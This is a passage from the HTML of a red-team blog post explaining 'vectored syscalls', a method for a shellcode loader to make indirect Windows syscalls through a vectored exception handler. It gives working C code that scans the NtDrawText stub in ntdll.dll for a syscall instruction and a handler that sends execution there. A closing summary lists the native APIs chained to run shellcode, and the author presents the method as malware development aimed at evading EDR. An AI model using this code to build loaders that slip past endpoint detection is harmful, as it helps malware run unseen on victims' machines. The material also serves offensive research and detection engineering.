+<p>In principle, this prepares the <code class="inline-code">SSN</code> in the <code class="inline-code">rax</code> register (similar to preparation using assembly code <code class="inline-code">mov eax, SSN</code>) for subsequent execution using <code class="inline-code">syscalls</code>. This process is repeated until all native APIs used in the shellcode loader or initiated via <code class="inline-code">SSN</code> have been passed to the vectored exception handler and processed after an <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> has been triggered.<br><br>Note: The <code class="inline-code">SSN</code> for <code class="inline-code">NtAllocateVirtualMemory()</code> does not necessarily have to be <code class="inline-code">0x18</code>, as the <code class="inline-code">SSNs</code> for the same function can vary from Windows to Windows and from version to version.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Find Syscall and Return&nbsp;</h4>
+<p>Finally, in order to execute the <code class="inline-code">SSN</code> (which is already in the rax register) within the VEH function <code class="inline-code">PvectoredExceptionHandler()</code>, we need to find a way to pass the memory address of a <code class="inline-code">syscall</code> instruction to the <code class="inline-code">rip</code> register.<br><br>The first step is to use the Windows API <code class="inline-code">GetModuleHandleA()</code> to access the <code class="inline-code">ntdll.dll</code> memory. The next step is to use the <code class="inline-code">GetProcAddress()</code> API to access a native API such as <code class="inline-code">NtDrawText()</code>. Which API we access in this case does not matter and is independent of which native API we use to reserve memory, copy shellcode, execute shellcode, etc.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Retrieve the module handle for ntdll.dll (Windows NT Layer DLL)
+HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+if (hNtdll == NULL) {
+    printf("Failed to get module handle for ntdll.dll\n");
+    exit(-1);
+}
+
+// Retrieve the address of the NtDrawText function in ntdll.dll
+FARPROC drawtext = GetProcAddress(hNtdll, "NtDrawText");
+if (drawtext == NULL) {
+    printf("Error GetProcess Address\n");
+    exit(-1);
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Ultimately it is just a matter of using the <code class="inline-code">FindSyscallAddr</code> function to access the base address of the previously selected Native API <code class="inline-code">NtDrawText()</code>, and then using an opcode comparison via a while loop to find the <code class="inline-code">syscall</code> and <code class="inline-code">return</code> statement within the syscall stub.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Function to find the syscall instruction within a function in ntdll.dll
+BYTE* FindSyscallAddr(ULONG_PTR base) {
+    // Cast the base address to a BYTE pointer for byte-level manipulation
+    BYTE* func_base = (BYTE*)(base);
+    // Temporary pointer for searching the syscall instruction
+    BYTE* temp_base = 0x00;           
+
+    // Iterate through the function bytes to find the syscall instruction pattern (0x0F 0x05)
+    // 0xc3 is the opcode for the 'ret' (return) instruction in x64 assembly
+    while (*func_base != 0xc3) {      
+        temp_base = func_base;
+        // Check if the current byte is the first byte of the syscall instruction
+        if (*temp_base == 0x0f) {     
+            temp_base++;
+            // Check if the next byte completes the syscall instruction
+            if (*temp_base == 0x05) { 
+                temp_base++;
+                // Check for 'ret' following the syscall to confirm it's the end of the function
+                if (*temp_base == 0xc3) { 
+                    temp_base = func_base;
+                    break;
+                }
+            }
+        }
+        else {
+            // Move to the next byte in the function
+            func_base++;              
+            temp_base = 0x00;
+        }
+    }
+    // Return the address of the syscall instruction
+    return temp_base;                
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><br class="Apple-interchange-newline"><img src="https://redops.at/assets/images/blog/opcode_comparison2.png" alt=""></figure>
+<p><br>The following illustration uses debugging in IDA to show how the base address of the native API <code class="inline-code">NtDrawtext()</code> in the memory of <code class="inline-code">ntdll.dll</code> is first accessed using the Windows APIs <code class="inline-code">GetModuleHandleA()</code> and <code class="inline-code">GetProcAddress()</code> and then the opcode comparison for <code class="inline-code">0xf</code>, <code class="inline-code">0x05</code> (syscall) and <code class="inline-code">0xc3</code> (return) is performed using <code class="inline-code">cmp</code>.  </p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/IDA_opcode_cmp2.png" alt=""></figure>
+<p>The memory address of the syscall instruction is buffered by the <code class="inline-code">g_syscall_addr</code> variable, which is declared global.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Global variable to store the address of the syscall instruction
+ULONG_PTR g_syscall_addr = 0x00;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Finally, the memory address (pointing to the syscall instruction within the syscall stub of <code class="inline-code">NtDrawText()</code>) is passed to the <code class="inline-code">rip</code> register within the VEH function <code class="inline-code">PvectoredExceptionHandler()</code> using <code class="inline-code">exception_ptr</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Vectored Exception Handler function
+LONG CALLBACK PvectoredExceptionHandler(PEXCEPTION_POINTERS exception_ptr) {
+    // Check if the exception is an access violation
+    if (exception_ptr-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+        // Modify the thread's context to redirect execution to the syscall address
+        // Copy RCX register to R10
+        exception_ptr-&gt;ContextRecord-&gt;R10 = exception_ptr-&gt;ContextRecord-&gt;Rcx;
+
+        // Copy RIP (Instruction Pointer) to RAX (RIP keeps SSN --&gt; RAX keeps SSN)		
+        exception_ptr-&gt;ContextRecord-&gt;Rax = exception_ptr-&gt;ContextRecord-&gt;Rip;
+
+        // Set RIP to global address (set syscalls address retrieved from NtDrawText to RIP register)		
+        exception_ptr-&gt;ContextRecord-&gt;Rip = g_syscall_addr;
+
+        // Continue execution at the new instruction pointer
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    // Continue searching for another exception handler
+    return EXCEPTION_CONTINUE_SEARCH;
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Set RIP to the syscall address for execution
+exception_ptr-&gt;ContextRecord-&gt;Rip = g_syscall_addr;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As a reminder: When trying to initialise a native API, e.g. <code class="inline-code">NtAllocateVirtualMemory()</code> via <code class="inline-code">SSN</code>, we were already able to specifically trigger the vectored exception handler via Access Violation Exception and achieve a transfer of <code class="inline-code">SSN</code> <code class="inline-code">0x18</code> to the <code class="inline-code">rip</code> or <code class="inline-code">rax</code> register. As we now have a valid memory address for the <code class="inline-code">syscall</code> instruction in the context of the native API <code class="inline-code">NtDrawText()</code>, we can finally execute the <code class="inline-code">syscall</code> for the native API <code class="inline-code">NtAllocateVirtualMemory()</code> via Vectored Exception Handling.</p>
+<p>As mentioned above, this process is repeated until all native APIs used in the shellcode loader or initiated via <code class="inline-code">SSN</code> have been separately passed to the vectored exception handler after an <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> has been thrown, processed and finally the shellcode executed.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Summary</h3>
+<p>As a result, we now have the basis for executing the native APIs used in the context of the shellcode loader using syscalls via Vectored Exception Handling (Vectored Syscalls). Here is a rough summary of the main processes in the code.</p>
+<ul><li><code class="inline-code">PVECTORED_EXCEPTION_HANDLER</code> is used to define the vectored exception handler function <code class="inline-code">PvectoredExceptionHandler</code>.<br></li></ul>
+<p></p>
+<ul><li>Within the <code class="inline-code">PvectoredExceptionHandler()</code> function, we define the exception code, e.g. <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code>, that will trigger a pass to the vectored exception handler.</li></ul>
+<p></p>
+<ul><li>Within the <code class="inline-code">PvectoredExceptionHandler()</code>&nbsp;function, we define the necessary pointers to access the <code class="inline-code">rcx</code>, <code class="inline-code">r10</code>, <code class="inline-code">rax</code>, <code class="inline-code">rip</code> registers.</li></ul>
+<p></p>
+<ul><li>We deliberately trigger the <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> that was defined as the exception code within our VEH function. <br><br></li><li>The <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> is triggered by trying to initiate a native API, e.g. <code class="inline-code">NtAllocateVirtualMemory()</code> via <code class="inline-code">SSN</code>.<br><br></li><li>The <code class="inline-code">SSN</code> is passed to the <code class="inline-code">rip</code> register, which in turn is passed to the <code class="inline-code">rax</code> register within the VEH function. <br><br></li><li>The Windows API <code class="inline-code">GetModuleHandleA()</code> is used to access the <code class="inline-code">ntdll.dll</code> memory.<br><br></li><li>We also use <code class="inline-code">GetProcAddress()</code> to access the base address of any native API within <code class="inline-code">ntdll.dll</code> (e.g. <code class="inline-code">NtDrawText()</code>).<br><br></li></ul>
+<ul><li>The <code class="inline-code">FindSyscallAddr</code> function performs an opcode comparison using a while loop to find the memory address of the <code class="inline-code">syscall</code> instruction within the sycall stub of the native API (e.g. <code class="inline-code">NtDrawText()</code>).<br><br></li><li>The memory address of the <code class="inline-code">syscall</code> instruction is stored in the global variable <code class="inline-code">g_syscall_addr</code> and passed to the <code class="inline-code">rip</code> register within the VEH function.<br><br></li><li>The <code class="inline-code">syscall</code> is then executed by the registered vectored exception handler for the native API, e.g. <code class="inline-code">NtAllocateVirtualMemory()</code>.<br><br></li><li>Repeat the process for any other necessary native APIs required to execute the shellcode, e.g. <code class="inline-code">NtWriteVirtualMemory()</code>, <code class="inline-code">NtProtectVirtualMemory()</code>, <code class="inline-code">NtCreateThreadEx()</code> and <code class="inline-code">NtWaitForSingleObject()</code>.</li></ul>
+<p><br>Ultimately, this sequence allows us to execute the shellcode in our loader in the form of (indirect) syscalls using vectored exception handling.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Insights</h3>
+<p>As mentioned above, direct syscalls or indirect syscalls can be implemented via assembly code within a shellcode loader. However, this article has shown that this can also be done via Vectored Exception Handling (VEH).&nbsp;</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/comparison_idsc_vehsyscalls.png" alt=""></figure>
+<p>For example, if you compare the arrangement of stack frames within the thread call stack between an indirect syscall shellcode loader and a vectored syscall shellcode loader, you will see that the arrangement is completely identical. This is to be expected, as the execution of the <code class="inline-code">syscall</code> and <code class="inline-code">return</code> statements takes place within the memory of <code class="inline-code">ntdll.dll</code>, using vectored exception handling. <br><br>Despite the fact that the native API <code class="inline-code">NtWaitForSingleObject()</code> is executed last in both shellcode loaders, you can see in the thread call stack of the vectored syscall loader (image on the right) that, compared to the indirect syscall loader, the return statement is executed in the memory area of <code class="inline-code">NtDrawText()</code> and not in the memory area of <code class="inline-code">NtWaitForSingleObject()</code>. The simple reason for this is that in our Vectored Syscall Loader we access the base address of <code class="inline-code">NtDrawText()</code> via the Windows API <code class="inline-code">GetProcAddress()</code> in order to find the <code class="inline-code">syscall</code> statement within the syscall stub via an opcode comparison, Finally, the memory address of the <code class="inline-code">syscall</code> instruction is passed to the <code class="inline-code">rip</code> register in the context of <code class="inline-code">NtDrawText()</code> within the VEH function <code class="inline-code">PvectoredExceptionHandler()</code> to execute the <code class="inline-code">syscall</code> via the Vectored Exception Handler.<br><br>The extent to which executing syscalls via vectored exception handling offers an advantage over EDR evasion cannot yet be judged due to lack of experience. I hope this article has helped you learn more about vectored exception handling and how it can be used in malware development, e.g. to execute shellcode via syscalls. See you in the next article!</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-red">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Happy Hacking!</p>
+<p>Daniel Feichter <a href="https://twitter.com/VirtualAllocEx" target="_blank" rel="noreferrer noopener">@VirtualAllocEx</a></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-grey">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>References&nbsp;</h3>
+<ul><li><a href="https://cyberwarfare.live/bypassing-av-edr-hooks-via-vectored-syscall-poc/">https://cyberwarfare.live/bypa...</a></li><li><a href="https://github.com/RedTeamOperations/VEH-PoC/">https://github.com/RedTeamOper...</a></li><li><a href="https://billdemirkapi.me/exception-oriented-programming-abusing-exceptions-for-code-execution-part-1/">https://billdemirkapi.me/excep...</a></li><li><a href="https://www.elastic.co/security-labs/getting-gooey-with-guloader-downloader">https://www.elastic.co/securit...</a></li><li><a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/">https://www.crowdstrike.com/bl...</a></li></ul>
+        </div>
+    </div>
+</section>
+                    </div>
+        <div class="blog-info container">
+            <div class="updated">
+                Last updated
+                <span class="desktop">
+                    31.03.24 17:45:36
+                </span>
+                <span class="mobile">
+                    31.03.24
+                </span>
+            </div>
+            <div class="author">
+                Daniel Feichter
+            </div>
+        </div>
+        <div class="further-reading container">
+                                        <div class="heading">
+                    Posts about related Topics
+                </div>
+                        <ul class="blog-list">
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/edr-analysis-a-hypothesis-about-call-stack-analysis-and-enhanced-detection" class="blog-link">
+    <div class="tag">
+        Reversing
+    </div>
+    <div class="post-date">
+        2024-05-06
+    </div>
+    <div class="blog-title">
+        EDR Analysis: A Hypothesis about Call Stack Analysis and Enhanced Detection
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/edr-analysis-leveraging-fake-dlls-guard-pages-and-veh-for-enhanced-detection" class="blog-link">
+    <div class="tag">
+        Reversing
+    </div>
+    <div class="post-date">
+        2024-05-05
+    </div>
+    <div class="blog-title">
+        EDR Analysis: Leveraging Fake DLLs, Guard Pages, and VEH for Enhanced Detection
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/shellcode-execution-via-asynchronous-procedure-calls" class="blog-link">
+    <div class="tag">
+        Malware Development
+    </div>
+    <div class="post-date">
+        2024-03-14
+    </div>
+    <div class="blog-title">
+        Shellcode Execution via Asynchronous Procedure Calls
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/malware-development-workshop" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2024-02-05
+    </div>
+    <div class="blog-title">
+        University of Innsbruck-Malware Development Workshop
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                            </ul>
+        </div>
+    </div>
+        </main>
+        <button type="button" id="BackToTop">Back to top</button>
+        <footer id="Footer" class="bg-dark">
+            <div class="footer container">
+    <div class="info">
+        <div class="logo">
+            RedOps
+        </div>
+        <div class="mission">
+            <p>At <strong>RedOps</strong>, we see ourselves as an IT security sparring partner for our customers, helping you to incrementally improve your organisation's IT security posture and cyber resilience.</p>
+        </div>
+        <div class="contact-us">
+            <p>
+                Contact us
+            </p>
+            <a href="mailto:office@redops.at" class="email glitch" data-plausible-event="click:email" data-plausible-props="footer" data-content="office@redops.at">
+                office@redops.at
+            </a>
+        </div>
+        <div class="social-networks">
+            <a href="https://www.linkedin.com/in/daniel-feichter-5277a0140/" class="linkedin">linkedin</a>
+            <a href="https://twitter.com/VirtualAllocEx" class="twitter">twitter</a>
+        </div>
+        <div class="links">
+            <div class="heading">
+                Links
+            </div>
+            <ul class="link-list">
+                                                    <li class="link-entry">
+                        <a href="https://redops.at/en/expertise" class="glitch" data-content="Services">Services</a>
+                    </li>
+                                    <li class="link-entry">
+                        <a href="https://redops.at/en/about-us" class="glitch" data-content="About Us">About Us</a>
+                    </li>
+                                    <li class="link-entry">
+                        <a href="https://redops.at/en/kontakt" class="glitch" data-content="Contact">Contact</a>
+                    </li>
+                            </ul>
+        </div>
+        <div class="legal">
+            <div class="heading">
+                Legal
+            </div>
+            <ul class="legal-list">
+                                                <li class="legal-entry">
+                    <a href="https://redops.at/en/impressum" class="glitch" data-content="Imprint">Imprint</a>
+                </li>
+                <li class="legal-entry">
+                    <a href="https://redops.at/en/privacy" class="glitch" data-content="Privacy Statement">Privacy Statement</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="copyright">
+        <div class="redops">
+            © 2024 REDOPS
+        </div>
+        <div class="bitperfect">
+            <span class="text">Created by</span>
+            <a href="https://bitperfect.at" class="glitch" data-content="bitperfect">bitperfect</a>
+        </div>
+    </div>
+        <div class="footer-link">
+        <a href="https://redops.at/en/knowledge-base" class="link h1 glitch" data-content="Knowledge Base">
+            Knowledge Base
+        </a>
+    </div>
+</div>
+        </footer>
+
+        <script type="module">!function(){const e=document.createElement("link").relList;if(!(e&&e.supports&&e.supports("modulepreload"))){for(const e of document.querySelectorAll('link[rel="modulepreload"]'))r(e);new MutationObserver((e=>{for(const o of e)if("childList"===o.type)for(const e of o.addedNodes)if("LINK"===e.tagName&&"modulepreload"===e.rel)r(e);else if(e.querySelectorAll)for(const o of e.querySelectorAll("link[rel=modulepreload]"))r(o)})).observe(document,{childList:!0,subtree:!0})}function r(e){if(e.ep)return;e.ep=!0;const r=function(e){const r={};return e.integrity&&(r.integrity=e.integrity),e.referrerpolicy&&(r.referrerPolicy=e.referrerpolicy),"use-credentials"===e.crossorigin?r.credentials="include":"anonymous"===e.crossorigin?r.credentials="omit":r.credentials="same-origin",r}(e);fetch(e.href,r)}}();</script>
+<script type="module" src="https://redops.at/dist/assets/main-DC6VkGeL.js" crossorigin="" onload="e=new CustomEvent('vite-script-loaded', {detail:{path: 'resources/js/main.ts'}});document.dispatchEvent(e);"></script>
+<link href="https://redops.at/dist/assets/main-ioE-islD.css" rel="stylesheet" media="all" onload="this.media='all'">
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js" integrity="sha512-9khQRAUBYEJDCDVP2yw3LRUQvjJ0Pjx0EShmaQjcHa6AXiOv6qHQu9lCAIR8O+/D8FtaCoJ2c0Tf9Xo7hYH01Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-SkmBfuA2hqjzEVpmnMt/LINrjop3GKWqsuLSSB3e7iBmYK7JuWw4ldmmxwD9mdm2IRTTi0OxSAfEGvgEi0i2Kw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    
+
+</body></html>
